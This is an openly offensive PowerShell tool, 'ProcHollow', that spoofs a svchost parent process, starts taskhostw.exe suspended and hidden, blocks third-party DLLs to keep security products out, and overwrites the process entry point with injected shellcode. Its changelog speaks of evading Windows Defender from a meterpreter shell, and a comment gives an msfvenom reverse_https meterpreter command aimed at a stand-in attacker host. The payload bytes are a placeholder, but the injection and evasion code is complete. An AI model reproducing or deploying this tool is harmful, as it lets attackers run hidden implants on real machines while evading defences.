<#
Version: 1.1
Author: @bowtiejicode (https://github.com/bowtiejicode)
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: None


====== Change Log ======

2022-12-10 -- v1.1
   - Integrated with PPID
   - Resolved v1.0 issue on alerting Windows Defender upon spawning cmd.exe from meterpreter shell

2021-09-18 -- v1.0
   - Simple Process Hollowing
   - Windows Defender alert pop up when launch cmd.exe but our meterpreter shell will not die (probably work to resolve this in next ver)
#>

Add-Type -TypeDefinition @"
	using System;
	using System.Diagnostics;
	using System.Runtime.InteropServices;
	

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_BASIC_INFORMATION
    {
        public IntPtr Reserved1;
        public IntPtr PebAddress;
        public IntPtr Reserved2;
        public IntPtr Reserved3;
        public IntPtr UniquePid;
        public IntPtr MoreReserved;
    }


	[StructLayout(LayoutKind.Sequential)]
	public struct PROCESS_INFORMATION
	{
		public IntPtr hProcess; public IntPtr hThread; public uint dwProcessId; public uint dwThreadId;
	}
	
	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct STARTUPINFO
	{
		public uint cb; public string lpReserved; public string lpDesktop; public string lpTitle;
		public uint dwX; public uint dwY; public uint dwXSize; public uint dwYSize; public uint dwXCountChars;
		public uint dwYCountChars; public uint dwFillAttribute; public uint dwFlags; public short wShowWindow;
		public short cbReserved2; public IntPtr lpReserved2; public IntPtr hStdInput; public IntPtr hStdOutput;
		public IntPtr hStdError;
	}

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public struct STARTUPINFOEX
        {
            public STARTUPINFO StartupInfo;
            public IntPtr lpAttributeList;
        }
	
	[StructLayout(LayoutKind.Sequential)]
	public struct SECURITY_ATTRIBUTES
	{
		public int length; public IntPtr lpSecurityDescriptor; public bool bInheritHandle;
	}
	
    public static class Ntdll{
        [DllImport("ntdll.dll")]
        public static extern int ZwQueryInformationProcess(IntPtr hProcess, int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation, IntPtr ProcInfoLen, ref uint retlen);

    }
	public static class Kernel32
	{
        [DllImport("kernel32.dll")]
        public static extern bool CreatePipe(out IntPtr hReadPipe, out IntPtr hWritePipe, ref SECURITY_ATTRIBUTES lpPipeAttributes, uint nSize);
     
        [DllImport("kernel32.dll")]
        public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
 
        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool UpdateProcThreadAttribute(IntPtr lpAttributeList, uint dwFlags, IntPtr Attribute, IntPtr lpValue, IntPtr cbSize, IntPtr lpPreviousValue, IntPtr lpReturnSize);

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool InitializeProcThreadAttributeList(IntPtr lpAttributeList, int dwAttributeCount, int dwFlags, ref IntPtr lpSize);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool SetHandleInformation(IntPtr hObject, uint dwMask, uint dwFlags);

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool DuplicateHandle(IntPtr hSourceProcessHandle,
           IntPtr hSourceHandle, IntPtr hTargetProcessHandle, ref IntPtr lpTargetHandle,
           uint dwDesiredAccess, [MarshalAs(UnmanagedType.Bool)] bool bInheritHandle, uint dwOptions);

        [DllImport("kernel32.dll")]
        public static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);
    
        [DllImport("kernel32.dll")]
        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        public static extern uint ResumeThread(IntPtr hThread);
		
        [DllImport("kernel32.dll")]
		public static extern bool CreateProcess(
			string lpApplicationName, string lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes, 
			ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, 
			IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFOEX lpStartupInfo, 
			out PROCESS_INFORMATION lpProcessInformation);
	}
"@

# ASCII Art - Feel free to remove

Write-Host "                                       _____  _____ _____ _____      "                      
Write-Host "                                      |  __ \|  __ \_   _|  __ \            "               
Write-Host "                                      | |__) | |__) || | | |  | |            "              
Write-Host "          ((((((((*                   |  ___/|  ___/ | | | |  | |              /#######(         "
Write-Host "       (((((((((((((((,               | |    | |    _| |_| |__| |              *##############(      "
Write-Host "      ((((((((((((((((((((            |_|    |_|   |_____|_____/           .##################((     "
Write-Host "     (((((((((((((((((((((((((                                         ######################(((    "
Write-Host "     (((((((((((((((((((((((((((((     **                   /,     ##########################(((    "
Write-Host "     ((((((((((((((((((((((((((((((((,     ************,,,     *#############################(((    "
Write-Host "     ((((((((((((((((  ,(((((((((((((((,   ************,,,   ###############(,  #############(((    "
Write-Host "     (((((((((((((((*                      ************,,,   ,                  (############(((    "
Write-Host "     ((((((((((((((((((((((((((((((,       ************,,,       ,###########################(((    "
Write-Host "     ((((((((((((((((((((((((((((((((((,   ************,,,   ################################(((    "
Write-Host "     (((((((((((((((((((((((((((((.        ************,,,        ,(#########################(((    "
Write-Host "     (((((((((((((((*                 ,.   ***********,,,,   /,                 #############(((    "
Write-Host "     (((((((((((((((( ,((((((((((((((((,   ,,,,,,,,,,,,,,,   (((##############, #############(((    "
Write-Host "     ((((((((((((((((((((((((((((((((      ,,,,,,,,,,,,,,,      ((((########################((((    "
Write-Host "     ((((((((((((((((((((((((((((.     **                   /*     *((((###################(((((    "
Write-Host "     ((((((((((((((((((((((((/     *///                      .///,     ((((#############((((((((    "
Write-Host "      ((((((((((((((((((((     .////*                           /////      ((((((((((((((((((((     "
Write-Host "       (((((((((((((((      //**.                                   ,**//      ((((((((((((((/      "
Write-Host "          *(((((((        _____                _    _       _ _                      .(((((((.         "
Write-Host "                         |  __ \              | |  | |     | | |              "
Write-Host "                         | |__) | __ ___   ___| |__| | ___ | | | _____      __"
Write-Host "                         |  ___/ '__/ _ \ / __|  __  |/ _ \| | |/ _ \ \ /\ / /"
Write-Host "                         | |   | | | (_) | (__| |  | | (_) | | | (_) \ V  V / "
Write-Host "                         |_|   |_|  \___/ \___|_|  |_|\___/|_|_|\___/ \_/\_/  "

Write-Host " "
Write-Host "Author: @bowtiejicode (https://github.com/bowtiejicode)"


    $parentProcessId = 0
    $parentProcessName = "svchost"
    $Binary = "C:\Windows\System32\taskhostw.exe"
    $CreationFlags = 0x4
    $ShowWindow = 0x0
    $StartF = 0x0
    
    # StartupInfo Struct
    $StartupInfo = New-Object STARTUPINFO
    $StartupInfo.dwFlags = $StartF # StartupInfo.dwFlag
    $StartupInfo.wShowWindow = $ShowWindow # StartupInfo.ShowWindow
    $StartupInfo.cb = [System.Runtime.InteropServices.Marshal]::SizeOf($StartupInfo) # Struct Size

    # STARTUPINFO Constants
    $STARTF_USESTDHANDLES = 0x00000100
    $STARTF_USESHOWWINDOW = 0x00000001
    $SW_HIDE = 0x0000

    # STARTUPINFOEX Constants
    $PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000
    $PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY = 0x00020007
    
    # dwCreationFlags Constants
    $EXTENDED_STARTUPINFO_PRESENT = 0x00080000
    $CREATE_NO_WINDOW = 0x08000000
    $CREATE_SUSPENDED = 0x00000004
    
    # DupHandle
    $DUPLICATE_CLOSE_SOURCE = 0x00000001
    $DUPLICATE_SAME_ACCESS = 0x00000002

    # Policy Constant
    $PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON = 0x100000000000
    
    # Let's find a parent process that has the same integrity level as your running process
    # If the parent process has same integrity level, you should be able to read the PriorityClass member as "Normal"
    $plausibleProcesses = Get-Process $parentProcessName | Where-Object {$_.PriorityClass -eq "Normal"}
    $noOfPlausibleProcesses = $plausibleProcesses.Length
    if ($noOfPlausibleProcesses -eq 0){
        throw "[!] Failed to find a good candidate for parent process"
    }
    Write-Host " "
    Write-Host "[+] Found $noOfPlausibleProcesses candidates for $parentProcessName" 
    $randomNumber = Get-Random -Minimum -0 -Maximum ($plausibleProcesses.Length - 1) # Why not? :)
    $parentProcessId = $plausibleProcesses[$randomNumber].Id
    Write-Host "[+] Selected parent process (PID: $parentProcessId) to spoof"
    if ($parentProcessId -eq 0){
        throw "[!] Parent processId still 0"
    }
    

    # Handle stuff
    $saHandles = New-Object SECURITY_ATTRIBUTES
    $saHandles.length = [System.Runtime.InteropServices.Marshal]::SizeOf($saHandles)
    $saHandles.bInheritHandle = $true
    $saHandles.lpSecurityDescriptor = [IntPtr]::Zero
  
    [IntPtr]$hStdOutRead = [IntPtr]::Zero
    [IntPtr]$hStdOutWrite = [IntPtr]::Zero
    [IntPtr]$hDupStdOutWrite = [IntPtr]::Zero
    
    # Creating anonymous pipe
    # Note: All pipe handles are also closed when the process terminates.
    $succ = [Kernel32]::CreatePipe([ref] $hStdOutRead, [ref] $hStdOutWrite, [ref] $saHandles, 0)
    $succ = [Kernel32]::SetHandleInformation($hStdOutRead, 1, 0);

    # StartupInfoEx Struct
    $siEx = New-Object STARTUPINFOEX
    $siEx.StartupInfo.cb = [System.Runtime.InteropServices.Marshal]::SizeOf($siEx)
    $siEx.StartupInfo.hStdError = $hStdOutWrite;
    $siEx.StartupInfo.hStdOutput = $hStdOutWrite;
    
    [IntPtr]$lpValueProc = [IntPtr]::Zero
    [IntPtr]$hSourceProcessHandle = [IntPtr]::Zero
    [IntPtr]$lpSize = [IntPtr]::Zero
    # Determining size first
    $success = [Kernel32]::InitializeProcThreadAttributeList([IntPtr]::Zero, 2, 0, [ref] $lpSize)
    # Allocating size and calling init attribute list for real
    $siEx.lpAttributeList = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($lpSize)
    $success = [Kernel32]::InitializeProcThreadAttributeList($siEx.lpAttributeList, 2, 0, [ref] $lpSize)
    if ($success -eq $false){
        throw "[!] InitializeProcThreadAttributeList failed!"
    }
    
    # Lets prevent 3rd party (non-MS signed) DLLs from injecting into our process
    # Source: https://www.ired.team/offensive-security/defense-evasion/preventing-3rd-party-dlls-from-injecting-into-your-processes
    [IntPtr]$lpMitigationPolicy = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([IntPtr]::Size)
    [System.Runtime.InteropServices.Marshal]::WriteInt64($lpMitigationPolicy, $PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON);
    $success = [Kernel32]::UpdateProcThreadAttribute($siEx.lpAttributeList, 0, [IntPtr]$PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, $lpMitigationPolicy, [IntPtr]::Size, [IntPtr]::Zero, [IntPtr]::Zero)
    if ($success -eq $false){
        throw "[!] Set process mitigation policy failed!"
    }


    
    # Open process with ProcessAccessFlags.CreateProcess -bor ProcessAccessFlags.DuplicateHandle
    [IntPtr]$parentHandle = [Kernel32]::OpenProcess(0x000000c0, $false, $parentProcessId)
    
    
    # Persist this value until attribute list is deleted
    $lpValueProc = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([IntPtr]::Size)
    [System.Runtime.InteropServices.Marshal]::WriteIntPtr($lpValueProc, $parentHandle)
    
    # Updating attrib list...
    $success = [Kernel32]::UpdateProcThreadAttribute($siEx.lpAttributeList, 0, [IntPtr]$PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, $lpValueProc, [IntPtr]::Size, [IntPtr]::Zero, [IntPtr]::Zero)
    if ($success -eq $false){
        throw "[!] Failed to update attrib list!"
    }
   

    [IntPtr]$hCurrent = [System.Diagnostics.Process]::GetCurrentProcess().Handle

    # Opening parent process with ProcessAccessFlags.DuplicateHandle flag
    [IntPtr]$hNewParent = [Kernel32]::OpenProcess(0x00000040, $true, $parentProcessId)
    
    # Duplicating current handle --> parent handle 
    $success = [Kernel32]::DuplicateHandle($hCurrent, $hStdOutWrite, $hNewParent, [ref] $hDupStdOutWrite, 0, $true, $DUPLICATE_CLOSE_SOURCE -bor $DUPLICATE_SAME_ACCESS)    
    if ($success -eq $false){
        throw "[!] Duplicate handle failed!"
    }
    
    $siEx.StartupInfo.hStdError = $hDupStdOutWrite;
    $siEx.StartupInfo.hStdOutput = $hDupStdOutWrite;
    $siEx.StartupInfo.dwFlags = $STARTF_USESHOWWINDOW -bor $STARTF_USESTDHANDLES;
    $siEx.StartupInfo.wShowWindow = $SW_HIDE;

    # SECURITY_ATTRIBUTES Struct (Proc & Thread)
    $SecAttrProc = New-Object SECURITY_ATTRIBUTES
    $SecAttrProc.length = [System.Runtime.InteropServices.Marshal]::SizeOf($SecAttrProc)
    $SecAttrThread = New-Object SECURITY_ATTRIBUTES
    $SecAttrThread.length = [System.Runtime.InteropServices.Marshal]::SizeOf($SecAttrThread)

    # ProcessBasicInformation struct
    $bi = New-Object PROCESS_BASIC_INFORMATION
    # ProcessInfo Struct
    $ProcessInfo = New-Object PROCESS_INFORMATION
	
    # Making the process more realistic
    $CurrentPath = Split-Path -Path $Binary
    $CommandLine = Split-Path -Path $Binary -Leaf

    # Call CreateProcess
    # Beware of unquoted path in lpApplicationName ($Binary) https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa#security-remarks
    [bool]$succ = [Kernel32]::CreateProcess($Binary, $CommandLine, [ref] $SecAttrProc, [ref] $SecAttrThread, $true, $EXTENDED_STARTUPINFO_PRESENT -bor $CREATE_NO_WINDOW -bor $CREATE_SUSPENDED, [IntPtr]::Zero, $CurrentPath, [ref] $siEx, [ref] $ProcessInfo)
    if ($succ -eq $false){
        throw "[!] Failed to create process"
    }
    $childPID = $ProcessInfo.dwProcessId
    Write-Host "[+] Created $CommandLine (PID: $childPID) under $parentProcessName (PID: $parentProcessId)"

    [UInt32]$tmp = 0
    [IntPtr]$hProcess = $ProcessInfo.hProcess
    [IntPtr]$s = [IntPtr]::Size * 6
    $ntstatus_int = [Ntdll]::ZwQueryInformationProcess($hProcess, 0, [ref] $bi, $s, [ref] $tmp)
    
    [IntPtr]$ptrToImageBase = [IntPtr]($bi.PebAddress.ToInt64() + 0x10) 
    
    [Byte[]]$addrBuf = [System.Array]::CreateInstance([byte],[IntPtr]::Size)
    [IntPtr]$nRead = [IntPtr]::Zero
    $succ = [Kernel32]::ReadProcessMemory($hProcess, $ptrToImageBase, $addrBuf, $addrBuf.Length, [ref] $nRead);
    if ($succ -eq $false){
        throw "[!] ReadProcessMemory failed"
    }
    [IntPtr]$svchostBase = [IntPtr]([bitconverter]::ToInt64($addrBuf,0))
    [Byte[]]$data = [System.Array]::CreateInstance([byte],0x200) # Parse PE header
    $succ = [Kernel32]::ReadProcessMemory($hProcess, $svchostBase, $data, $data.Length, [ref] $nRead);
    if ($succ -eq $false){
        throw "[!] ReadProcessMemory failed"
    }
    [UInt32]$e_lfanew_offset = [bitconverter]::ToUInt32($data,0x3C)
    [UInt32]$opthdr = $e_lfanew_offset + 0x28;
    [UInt32]$entrypoint_rva = [bitconverter]::ToUInt32($data, [Int32]$opthdr);
    [IntPtr]$addressOfEntryPoint = [IntPtr]($entrypoint_rva + $svchostBase.ToInt64())
    
    #msfvenom -p windows/x64/meterpreter/reverse_https LHOST=KALI_IP LPORT=443 EXITFUNC=thread -f ps1
    [Byte[]] $buf = "Your payload here"

    $succ = [Kernel32]::WriteProcessMemory($hProcess, $addressOfEntryPoint, $buf, $buf.Length, [ref] $nRead);
    if ($succ -eq $false){
        throw "[!] WriteProcessMemory failed"
    }
    $result = [Kernel32]::ResumeThread($ProcessInfo.hThread);
    if ($result -eq -1){
        throw "[!] Failed to resume thread"
    }
    Write-Host "[+] Completed"